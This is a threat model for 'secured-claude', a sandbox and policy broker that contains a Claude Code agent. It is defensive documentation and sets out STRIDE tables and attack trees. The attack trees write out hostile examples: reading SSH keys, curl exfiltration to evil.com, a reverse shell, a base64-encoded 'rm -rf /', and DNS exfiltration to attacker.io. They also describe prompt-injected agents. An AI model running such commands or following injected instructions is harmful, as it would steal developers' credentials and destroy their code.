# Threat model — secured-claude v0.1

> **Method** — STRIDE (Microsoft, 1999) for threat classification, MITRE ATT&CK Mitigations (M1xxx) for control verification, attack trees (Schneier) for the top 5 risks.

---

## 1. Scope

### 1.1 In scope

- The Python broker code (`src/secured_claude/`) — CLI, gateway, store, hook script, orchestrator
- The Cerbos policies (`policies/`) — derived roles, filesystem, shell, network, MCP
- The Claude Code Docker image (`Dockerfile.claude-code` + `docker/`)
- The CI pipeline (`.gitlab-ci.yml`) and supply chain (build, sign, publish)
- The cross-platform install scripts (`install.sh`, `install.ps1`)

### 1.2 Out of scope (honest limits — see SECURITY.md §8)

- Kernel CVEs / 0-days — namespace isolation is the v0.1 boundary, v0.2+ may add gVisor.
- Side-channel attacks (Spectre/Meltdown class).
- Physical adversary at the host machine.
- Anthropic Claude Code binary internals (we treat as black box, sandbox via L2/L3/L4).
- Cerbos PDP internals (we treat as a trusted dependency, signed image, pinned digest).
- The user's own home directory secrets when used by other applications outside secured-claude — we don't claim to protect data the user gives to other tools.

## 2. Assets

| ID | Asset | Worth | Where it lives |
|---|---|---|---|
| **A1** | Developer credentials (SSH private keys, AWS profile, GCP token, GitHub PAT, NPM token) | Compromise = lateral access to production systems | `~/.ssh/`, `~/.aws/`, `~/.config/gh/`, `.npmrc` on the host |
| **A2** | Source code (current and historical) | Confidentiality (proprietary IP), integrity (no silent backdoor injection) | `/workspace/` mounted from host project dir |
| **A3** | The Anthropic API key | If exfiltrated → rogue agents on attacker's account, or pivoted into account-level abuse | `ANTHROPIC_API_KEY` env var passed to the agent container at runtime |
| **A4** | Secured-claude audit log | Integrity required for compliance ; tampering would invalidate retrospective security review | `~/Library/.../approvals.db` (Mac), `~/.local/share/.../approvals.db` (Linux), `%LOCALAPPDATA%\…\approvals.db` (Windows) |
| **A5** | Cerbos policy bundle | If altered, the gating itself becomes the attack vector | `policies/*.yaml` mounted RO into Cerbos container |
| **A6** | Production systems reachable from the dev machine (corporate VPN, cloud control plane) | High — agentic AI escaping into production is the meta-fear | Network reachable from host |
| **A7** | Browser session cookies, password manager databases | Adjacent to A1 — credential theft vector | Host-only paths (`~/Library/Application Support/Google/Chrome/...`, `~/Library/Containers/com.1password.app/...`) |

## 3. Trust boundaries

```
                    ┌──────────────────────────────────────────────┐
                    │  Host (developer machine)                    │
                    │                                              │
                    │   ┌──────────────────────┐                  │
                    │   │ secured-claude CLI   │  ←── trusted by  │
                    │   │ broker (gateway,     │      user;       │
                    │   │ store, cerbos client)│      enforces    │
                    │   └─────┬────────────────┘      L1+L2+L3    │
                    │         │  Docker socket                     │
                    │  ═══════│════════════════════════════════════│
                    │         │       trust boundary 1             │
                    │         ▼                                    │
                    │   ┌──────────────────────────────┐           │
                    │   │ Cerbos PDP (container)       │           │
                    │   │ - reads policies (RO mount)  │           │
                    │   │ - port 3592 → host only      │           │
                    │   └──────────────────────────────┘           │
                    │                                              │
                    │   ┌──────────────────────────────┐           │
                    │   │ Claude Code (container)      │  ←── L3+L4│
                    │   │ - workspace RW mount         │      isolation│
                    │   │ - egress allowlist (L2)      │           │
                    │   │ - PreToolUse hook → broker   │           │
                    │   │ - LLM controlled by upstream │           │
                    │   │   trust boundary 2 (Anthropic)           │
                    │   └──────────────┬───────────────┘           │
                    │                  │                           │
                    └──────────────────┼───────────────────────────┘
                                       │  HTTPS (TLS 1.3)
                                       ▼
                              ┌────────────────────┐
                              │ api.anthropic.com  │  ← trust boundary 3
                              └────────────────────┘
```

**Trust boundary 1** : host ↔ container. The broker on the host is the trust authority ; the agent container is untrusted (can be jailbroken).
**Trust boundary 2** : the agent container ↔ the LLM running upstream (api.anthropic.com). LLM responses are untrusted input — the agent container could be told (via prompt injection) to attempt arbitrary actions ; the broker policy gates them.
**Trust boundary 3** : the network egress at `api.anthropic.com` itself. We trust Anthropic with the API key but bound the blast radius by L2 (only this host is reachable).

## 4. Threat actors

| Actor | Capability | Motive | Defended by |
|---|---|---|---|
| **TA-1 — Curious LLM** | Standard Claude Code agent ; no malicious intent ; may probe filesystem out of helpfulness ("let me check what's in `/etc/passwd`") | Helpful but unbounded | L1 + L3 |
| **TA-2 — Prompt-injected LLM** | Claude has been instructed (via injected web content, malicious commit message, README, etc.) to exfiltrate or persist | Adversary controls the prompt | L1 + L2 + L3 + L4 |
| **TA-3 — Compromised dependency** | A Python or npm package run during a Bash-approved `npm install` ships with a malicious post-install script | Supply chain | L2 (network) + L3 (FS) |
| **TA-4 — Jailbroken upstream binary** | The Claude Code binary itself has a CVE that allows arbitrary syscalls bypassing the hook | Upstream bug or backdoor | L2 (network) + L4 (caps drop) — **partial defense, residual risk** |
| **TA-5 — Network attacker on host LAN** | MITM on local broker port 8765 | Hijack policy decisions | Localhost-bind only ; tested in `tests/test_gateway.py` |
| **TA-6 — Unprivileged co-tenant** on shared Linux dev host | Wants to read approvals.db or alter policies | Lateral | OS file perms (0o600 on db, 0o644 on policies which are public anyway) |

## 5. STRIDE per asset

Legend : **L1**=hook, **L2**=net, **L3**=fs, **L4**=hardening, **L5**=audit log integrity.

### A1 — Developer credentials

| STRIDE | Threat | Defense |
|---|---|---|
| S — Spoofing | Agent claims to be the user → not applicable, single principal `claude-code-default` |
| T — Tampering | Agent writes to `~/.ssh/authorized_keys` | L1 (Cerbos DENY pattern `\.ssh/`) + L3 (host `~/.ssh/` invisible in container) |
| R — Repudiation | After exfiltration, agent denies | L5 (append-only audit log) |
| I — Info disclosure | Agent reads `~/.ssh/id_rsa` | L1 (DENY) + L3 (invisible) |
| D — DoS | Agent deletes credentials | L1 (Write/Edit DENY) + L3 (invisible) |
| E — Elevation | Use stolen creds to act as the user | Prevented by I+T |

### A2 — Source code

| STRIDE | Threat | Defense |
|---|---|---|
| T | Backdoor injection via `Edit` | L1 (Edit gated by Cerbos ; suspicious patterns flagged) + L5 (audit shows every Edit) |
| I | Exfiltrate source via `WebFetch POST` to attacker | L1 (WebFetch DENY non-allowlist host) + L2 (network blocks) |
| D | Delete source via `rm -rf /workspace` | L1 (Bash `rm -rf /` DENY) + git fallback |

### A3 — Anthropic API key

| STRIDE | Threat | Defense |
|---|---|---|
| I | Agent prints `ANTHROPIC_API_KEY` to stdout / WebFetch POSTs it | L1 (WebFetch DENY) + L2 (network outbound only to api.anthropic.com which is the legitimate consumer) |
| T | Agent rotates the key at Anthropic console (would need WebFetch to console.anthropic.com) | L2 (DENY console.anthropic.com — not on the allowlist) |
| E | Use the key to spawn rogue agents | Bounded by L2 ; prompt injection still possible at API layer ; v0.2 will add per-request budget via Anthropic API key with low quota |

### A4 — Audit log

| STRIDE | Threat | Defense |
|---|---|---|
| T | Agent tampers with approvals.db | L3 (db lives on host, container has no FS access) ; SQLite trigger refusing UPDATE/DELETE if exposed via API |
| R | Lost decisions = no proof | Append-only INSERT, journaling enabled, optional SIEM export |

### A5 — Cerbos policy bundle

| STRIDE | Threat | Defense |
|---|---|---|
| T | Agent rewrites `policies/filesystem.yaml` to add an ALLOW everything rule | L3 (policies mounted RO into Cerbos container, agent container has no access) ; CI enforces signed policy bundles in v0.2 |

### A6 — Production systems

| STRIDE | Threat | Defense |
|---|---|---|
| I + T | Agent uses `Bash kubectl exec ...` against prod cluster | L1 (kubectl is allowlisted but Cerbos can DENY based on KUBECONFIG context) — partial ; recommended : run secured-claude on a dev-isolated machine without prod creds |
| E | SSH into prod via `Bash ssh prod-host` | L1 (`ssh` not in default allowlist) |

### A7 — Browser cookies / password manager DBs

| Defense | Same as A1 — paths out of `/workspace/`, invisible in container (L3) |

## 6. Attack trees (top 5 risks)

### AT-1 — "LLM exfiltrates SSH key"

```
GOAL: Read ~/.ssh/id_rsa and POST to attacker
├── (a) Direct Read tool                 [L1 DENY]
│   └── Cerbos rule fs:deny path .ssh/
├── (b) Bash "cat ~/.ssh/id_rsa"         [L1 DENY + L3 invisible]
│   ├── L1: Bash command resolved, args contain .ssh/ → DENY
│   └── L3: container has no ~/.ssh/, syscall would fail anyway
├── (c) Write a script to /workspace then exec it
│   ├── L3: script can only see /workspace, no host FS
│   └── L1: shell process spawned, every syscall to outside /workspace fails
└── (d) Use MCP server with elevated FS access
    └── L1: mcp_tool default DENY, must be allowlisted
```

### AT-2 — "Compromised npm dep exfiltrates source"

```
GOAL: Inside `npm install` (allowed Bash), exfiltrate /workspace
├── (a) postinstall script does `curl evil.com -d @./...`
│   ├── L2: network egress denies evil.com
│   └── DNS attempt may leak — see residual risks
├── (b) postinstall opens a reverse shell
│   ├── L2: outbound to non-allowlisted host blocked
│   └── L4: container limits prevent persistence on reboot
└── (c) postinstall writes to ~/.bashrc
    └── L3: ~/.bashrc not mounted, write fails
```

### AT-3 — "Prompt injection in a README causes destructive Bash"

```
GOAL: Cause `rm -rf /` damage
├── (a) Direct Bash "rm -rf /"          [L1 DENY string match]
├── (b) Bash "rm -rf $HOME"             [L1 DENY pattern recursive-rm]
├── (c) Encoded: `eval $(echo cm0gLXJmIC8= | base64 -d)`  [L1 DENY base64+eval pattern]
├── (d) Multiple steps:                 [L1 + L5 audit shows each step]
│   1. Write a script (L3 only writes /workspace)
│   2. chmod +x (L1 chmod allowlist limited)
│   3. Bash ./script.sh (L1 sees the bash invocation, but contents already in /workspace)
└── (e) Within /workspace anyway        [Acceptable — git restore + L5 audit ID culprit]
    └── Note: /workspace is the user's own project ; we can't prevent the user
        from running destructive commands on their own files. Mitigated by
        git history + the audit log showing what was done.
```

### AT-4 — "Network exfil via DNS leak"

```
GOAL: Exfil base64-encoded data via DNS queries to attacker.io
├── (a) Direct WebFetch http://attacker.io/?d=...   [L1 + L2 DENY]
├── (b) Bash dig attacker.io                         [L1: dig not in allowlist]
├── (c) nslookup attacker.io                         [L1 DENY]
└── (d) Implicit DNS via curl in approved Bash       [v0.1 RESIDUAL]
    └── npm install resolves DNS for non-allowlisted hosts before L2 blocks the connection.
        Tracked as residual risk #R-DNS-LEAK ; v0.2 mitigation: dnsmasq sidecar with allowlist.
```

### AT-5 — "Kernel CVE allowing container escape"

```
GOAL: Escape container, access host
└── Out of scope for v0.1 defenses.
    Mitigation: keep host kernel patched, use Docker Desktop with auto-update,
    consider gVisor (v0.2+) for higher-assurance environments.
    Residual risk #R-KERNEL-CVE ; documented.
```

## 7. Residual risks (acknowledged)

| ID | Risk | v0.1 mitigation | v0.2+ plan |
|---|---|---|---|
| R-DNS-LEAK | Container can resolve any DNS name even if connection is blocked | None | dnsmasq sidecar with allowlist ; or `--dns=8.8.8.8 --dns-opt=ndots:0` + drop UDP egress |
| R-KERNEL-CVE | Linux kernel namespace escape | Host patch hygiene | gVisor (`runsc`) or Firecracker for high-assurance |
| R-PROMPT-INJ-IN-DEV | Prompt injection in /workspace causes the user's own files to be modified | L5 audit log + git history | LLM-side defense (system prompt hardening) — out of our scope |
| R-CERBOS-CVE | Cerbos PDP itself has a CVE | Pinned digest, Renovate auto-updates | Signed policy bundles + multi-PDP redundancy |
| R-UPSTREAM-CLAUDE-CVE | Anthropic Claude Code CLI binary has a CVE bypassing the hook system | L2 + L4 contain the blast radius | Pin claude version, monitor Anthropic security advisories, fast Renovate cycle |
| R-AUDIT-DOS | Adversary fills approvals.db with fake entries via repeated tool calls | Rate limit at the gateway (token bucket) | Per-principal quota + alert on anomalous insert rate |

## 8. Mapping to MITRE ATT&CK Mitigations

| Mitigation ID | Name | Implementation in secured-claude |
|---|---|---|
| **M1018** | User Account Management | Single principal model in v0.1 (`claude-code-default`) ; v0.2 multi-principal with role assignment via Cerbos derived roles |
| **M1026** | Privileged Account Management | Container runs as non-root UID ; no `sudo` in image ; broker requires no elevated host privileges beyond Docker socket |
| **M1030** | Network Segmentation | Docker custom network with egress allowlist (L2) ; broker bound to localhost only |
| **M1038** | Execution Prevention | Cerbos shell allowlist (L1) ; Bash command first-word check ; pattern match on full command |
| **M1042** | Disable or Remove Feature/Program | MCP servers default-DENY ; only explicitly allowlisted MCPs callable ; Bash builtins like `eval` flagged |
| **M1047** | Audit | SQLite append-only log of every decision (ALLOW + DENY) ; every release ships with `audit-demo` proof |
| **M1054** | Software Configuration | Cerbos policies as code, lintable (`cerbos compile`), Git-versioned, optionally signed |
| **M1056** | Pre-compromise | Threat-model.md (this doc), audit-demo --strict on every release, Renovate dep updates |

## 9. Re-validation cadence

This threat model is reviewed :

- **Every minor release** (v0.X.0) — quick check that new features don't open new attack paths
- **Every quarter** — full re-audit, walk attack trees again, compare residual risks
- **After any reported vulnerability** — close the loop : was this captured? if not, update the model

Last reviewed : 2026-04-29. Next scheduled : 2026-07-29.

## 10. References

- Microsoft STRIDE — https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
- MITRE ATT&CK Mitigations — https://attack.mitre.org/mitigations/enterprise/
- NIST SP 800-160 V1 (Trustworthy Systems Engineering) — defense-in-depth principle §3.4
- Bruce Schneier, *Attack Trees* (1999) — https://www.schneier.com/academic/archives/1999/12/attack_trees.html
- ADRs explaining each defense layer : [`docs/adr/0010`](../adr/0010-network-egress-filter-allowlist.md), [`docs/adr/0012`](../adr/0012-defense-in-depth-layers.md)
